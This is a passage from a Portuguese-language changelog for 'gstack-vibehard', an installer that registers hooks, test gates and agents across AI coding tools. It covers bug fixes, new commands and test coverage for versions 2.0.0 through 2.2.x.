- **SaaS / Mobile**: `dev:web`/`dev:api`/`dev:mobile` agora resolvem (cada app com `package.json` e scripts dev reais); o scaffold criava `apps/api/src/*` sem o diretorio (crash) — corrigido.
- **AI**: declara `langchain-openai` e corrige o typo `ChatOpenAi` -> `ChatOpenAI`.
- **Dockerfile por stack**: AI = Python (uvicorn); demais = Node. `dev.sh` com comando dev correto por template.
- **fullstack-monorepo CI**: `db:push:test` sem `cross-env ... cd` (builtin de shell); `typecheck` = `turbo typecheck` (era `turbo lint`).

### Modo lite honesto + pytest
- `create --lite` nao escreve config Casdoor nem anuncia IAM `localhost:8000` (servico offline em lite).
- Instalador instala `pytest` (hooks Python, QG e Test Gate dependem dele); `doctor` reporta.

### Testes
- +10 testes (Stop nao-intrusivo, merge/strip do Codex, contrato dos verticais, lite). 28 Node + 23 Python.

## [2.2.2] - 2026-06-15

### Correcoes (revisao do projeto inteiro)
- **Test Gate agora e opt-in.** Antes rodava a suite de testes do projeto em TODO Stop hook (que dispara a cada turno) — tornaria cada turno lento (ate 300s). Agora desligado por padrao; habilite com `GSTACK_TEST_GATE=on` (reporta) ou `=block` (bloqueia). (`hooks/hooks/stop.py`)
- **uninstall limpa a fonte canonica de hooks** `~/.gstack/hooks` (antes ficava orfa). (`src/installer/uninstall.js`)
- **uninstall desregistra os hooks** do `~/.claude/settings.json` e `~/.cursor/hooks.json` — sem isso, apos desinstalar o harness apontava para `.py` deletados e falhava em todo turno. Preserva hooks do usuario; remove eventos que ficavam vazios. Novo teste de regressao.

## [2.2.1] - 2026-06-15

### Documentacao
- README sincronizado com o estado do release: novidades v2.2.0 completas (Test Gate, novos detectores), historico v2.1.9 e contagem de testes corrigida (19 Node + 21 Python). Patch docs-only para alinhar a pagina do npm com o repositorio.

## [2.2.0] - 2026-06-15

**Hooks Reais Cross-Harness — a alma do produto funcionando de verdade.**

### Sprint 6 — Registro real de hooks
- **Claude Code**: `registerClaudeHooks` escreve `settings.json` no formato OFICIAL (`hooks.<Evento>[].hooks[]`) para PreToolUse/Stop/SessionStart/UserPromptSubmit. Idempotente, preserva hooks do usuario. Antes os hooks eram so copiados e nunca executados.
- **Cursor** (`src/harness/cursor.js`): `registerCursorHooks` em `~/.cursor/hooks.json` (formato `version: 1` — beforeShellExecution/preToolUse/stop/sessionStart).
- **OpenCode**: merge nao-destrutivo do `opencode.json` (antes sobrescrevia a config do usuario).
- **Camada de saida por harness** (`_harness.py`): `emit_permission_decision` responde `hookSpecificOutput` (Claude) ou `permission` (Cursor) conforme o payload; cwd via `workspace_roots`.
- **create.js**: `writeRealHarnessBridge` usa o formato real (chave ficticia `lifecycleHooks` removida) + `.cursor/hooks.json` por projeto.
- Fonte canonica de hooks em `~/.gstack/hooks/`; mensagens honestas para harnesses instrucionais.

### Sprint 7 — Test Gate (paridade Replit Agent)
- O Stop hook detecta e roda a suite de testes do projeto (npm test/pytest/cargo/go) com timeout. Default reporta; `GSTACK_TEST_GATE=block` devolve o controle ao agente para corrigir (respeita `stop_hook_active`); `=off` desativa.

### Sprint 8 — Cobertura de harnesses
- Novos detectores: GitHub Copilot CLI (`~/.copilot`/`COPILOT_HOME`), Factory Droid (`~/.factory`), Kilo Code CLI (`~/.config/kilo`), Kimi CLI (`~/.kimi`), VS Code (User dir por OS) — paths confirmados na doc oficial.
- Integracao instrucional real (`instructional.js`): escreve orientacao de QG/Test Gate/memoria/economia de tokens no convention de cada harness (AGENTS.md/GEMINI.md/global_rules.md/steering). Idempotente, preserva conteudo do usuario.
- `doctor` lista todos os harnesses detectados com nivel (hooks reais / instrucional / deteccao).

### Sprint 9 — Refactor CRAP com cobertura
- `deps.js` (novo, testavel): `findWorkingBinary`/`getUvCandidates`/`getBunCandidates`. `installDeps()` cc 47→37; `install()` cc 50→42 (vault/relatorio extraidos). Comportamento preservado.

### Matriz de suporte (honesta)
- **Hooks reais**: Claude Code, Cursor, OpenCode.
- **Instrucional**: Codex, Gemini, Windsurf, Kiro, Copilot CLI, Droid, KiloCLI, Kimi.
- **Deteccao**: Zed, VS Code.

### Testes & CI
- 19 testes Node + 21 Python (era 8+13 na v2.1.9). CI em matriz 3 SOs.

## [2.1.9] - 2026-06-09

### Correcoes Criticas de Execucao

- **Windows: rustup-init quebrado** — `\r` em template literal corrompia o caminho `$env:TEMP\rustup-init.exe` (virava carriage return). Download agora via `curl.exe` com argumentos em array (`src/installer/install.js`).
- **Windows: todos os downloads do `create` falhavam** — `param($u,$o)` via `powershell -Command` nunca recebia os argumentos; `-u`/`-o` vazavam para o `Invoke-RestMethod`. Substituido por `curl.exe` (`src/cli/create.js`).
- **Stop hook falhava toda sessao sem `openhands`** — sandbox agora e opt-in (`GSTACK_SANDBOX=1` ou flag `sandbox`); ausencia do CLI so falha quando o sandbox foi habilitado (`hooks/hooks/stop.py`).
- **`stop.py`: `gitignore_has_dotenv` nao existia** — validador `gitignore_env` do Security Gate sempre caia em erro. Funcao implementada.
- **`stop.py`: crash `chronicle_dir / str`** — funcao usada como Path; corrigido para `chronicle_dir_path`.
- **Design system mandate era codigo morto** — `pre_tool_use_security.py` lia `tool_input.command`, mas Write/Edit enviam `file_path`. Corrigido; mandato agora restrito a projetos gstack (`.gstack/` presente).
- **MCP do Claude Code em local errado** — `mcpServers` era escrito em `~/.claude/settings.json` (ignorado pelo Claude Code). Agora merge em `~/.claude.json`, preservando estado e configs do usuario (`src/harness/claude.js`).

### CI e Testes

- Workflow disparava apenas em `main`; o branch do repo e `master` — CI nunca rodou. Corrigido + jobs de testes Node e pytest adicionados.
- `npm test` rodava `doctor` em vez dos testes. Agora roda `node --test "tests/**/*.test.js"`.
- Testes JS restaurados: seam de injecao `exec(file, args, opts)` reintroduzido em `agent-distribution.js` (perdido no refactor execFileSync da v2.1.6) — testes nao fazem mais chamadas reais de `npx`.
- Testes Python renomeados `*.test.py` → `test_*.py` (pytest nunca os coletava).
- Fonte de agentes do OpenCode corrigida para `cursor` (formato AGENTS.md + rules/*.mdc) — eliminava warning de fonte ausente em toda instalacao.

### Novas Funcionalidades

- `gstack_vibehard uninstall` implementado — remove somente o que o instalador criou, restaura backups `.gstack_vibehard.bak`, exige `--yes` em modo nao-interativo. Preserva vault e deps globais.
- `gstack_vibehard list` implementado — componentes, skills, scripts e manifest.
- `gstack_vibehard install --skip-deps` (ou `GSTACK_SKIP_DEPS=1`) — pula instalacao de deps globais pesadas (bun, Rust, Chromium).
- `qg.py` agora reporta findings bloqueantes (nao-auto-fixaveis) com titulos sintetizados para metricas CRAP — antes o agente recebia `pass: false` com `issues: []` sem explicacao.

### Consistencia e Qualidade

- Hooks Python instalados apenas nos harnesses selecionados (antes: sempre em `~/.codex/hooks`).
- `check.js`: deteccao "ja instalado" do Claude usa o marcador definitivo (`ultracode.md`) em vez de `~/.claude/mcp.json` (nunca escrito).
- `deepMerge` nao muta mais o array do objeto de entrada.
- `doctor`: secao duplicada de ferramentas globais removida.
- `runCLI` com try/catch — erros viram mensagem amigavel (stack com `GSTACK_DEBUG=1`).
- `bundledDependencies` orfao removido do package.json; peers marcados como opcionais.
- Escape bash-style em comando PowerShell eliminado (download via argumentos em array).

### Debito Tecnico Conhecido (documentado, nao bloqueante)

- Fallow aponta complexidade CRAP alta em funcoes pre-existentes (`install()` cc 49, `installDeps()` cc 47, `doctor()` cc 30, `createProject()` cc 25). Refatoracao planejada para quando houver cobertura de testes dessas rotas.
- **Parcialmente pago na v2.2.0** (Sprint 9): helpers de resolucao de binario extraidos para `deps.js` (testavel, exec injetavel) — `installDeps()` 47→37; vault/relatorio extraidos de `install()` 50→42. `createProject()` e o restante permanecem como debito, a reduzir com cobertura end-to-end das rotas de scaffold.

## [2.0.1] - 2026-06-08

### Novas Funcionalidades

- Adicionado `gstack_vibehard create <nome-do-app>` para gerar um GStack Workspace Runtime omniharness em uma etapa.
- O novo scaffold gera `.gstack/app.json`, `.gstack/services.json`, `.gstack/secrets.schema.json`, `.mcp.json`, `Dockerfile`, `.dockerignore`, `scripts/dev.sh`, `AGENTS.md` e regras locais para Cursor, Windsurf e Cline.
- Scripts locais `workspace_manager.py`, `deep_research.py` e `team_builder.py` agora sao copiados para o app criado.
- Pos-instalacao de AgentMemory e Graphify roda em modo best-effort: falhas viram warnings e nao quebram o scaffold principal.

### Qualidade

- Adicionado teste de contrato para o comando `create`, cobrindo estrutura runtime, MCP e falhas nao bloqueantes de pos-instalacao.

## [2.0.0] - 2026-06-08

**A Era da Orquestracao e Memoria de Custo Zero**

A versao 2.0.0 e um salto arquitetural. O `gstack-vibehard` foi refatorado de um instalador de templates para uma **Plataforma de LLMOps Local**, integrando motores de codigo aberto sem quebrar a compatibilidade com a `v0.7.5`.

### Novas Funcionalidades (Arquitetura)

- **Instalador Cross-Harness Universal:** espalha agentes e ganchos nativamente para `Claude Code`, `Codex CLI`, `Cursor` e `OpenCode`.
- **Fabrica de Agentes:** adicionadas as pastas `core/` e `knowledge/`. O comando `npm run build:agents` funde esses arquivos e gera 21 especialistas para Claude, Codex e Cursor/OpenCode.
- **Orquestracao de Worktrees:** adicionado `workspace_manager.py` e suporte a `.worktreeinclude`. Agentes agora atuam em pastas isoladas, reduzindo race conditions entre multiplas LLMs.
- **Deep Research Nativo:** adicionado `deep_research.py`, que gera dossies de missao para pesquisa via Playwright MCP, Context7 e Headroom.
- **Fabrica de Times:** adicionado `team_builder.py` para invocar esquadroes como `pipeline`, `fan-out` e `producer-reviewer`.

### Qualidade e Governanca

- **Fallow no Quality Gate:** `qg.py` agora roda `npx fallow audit --format json`, fornecendo analise estatica deterministica.
- **Sandboxing Docker:** `stop.py` inclui isolamento de testes em Docker efemero quando `GSTACK_SANDBOX_TEST=1`.
- **Identidade e Delegacao RAG:** `session_start.py` injeta contexto para Permit.io, Composio e LiteLLM.
- **Cost Routing Local:** suporte a LiteLLM para roteamento de modelos e fallback.

### Memoria e Performance

- **Auto-Wiring Graphify + AgentMemory:** o instalador configura AgentMemory e instala Git Hooks do Graphify para manter o grafo atualizado.
- **Compressao de Contexto (Headroom):** `headroom` e adicionado ao `.mcp.json` para compressao de contexto.

### UX e Qualidade de Vida

- **Audio Cues:** hooks emitem `audio-cue:success` e `audio-cue:error` para feedback assincrono.
- **Agente Deployer:** 21o agente, especializado em GitHub CLI e Vercel CLI com Quality Gate antes de publicar.

### Correcoes de Bugs (v0.7.5 -> v2.0.0)

- `session_start.py` nao quebra mais stdout JSON caso um provedor MCP local esteja inativo.
- Compatibilidade Windows melhorada com `shutil.which` para resolver binarios `.cmd`.
- `stop.py` preserva stdout JSON mesmo com audio cues, sandbox e post-sprint.
- Instalador evita falhas bloqueantes em AgentMemory, Graphify hooks e distribuicao cross-harness.
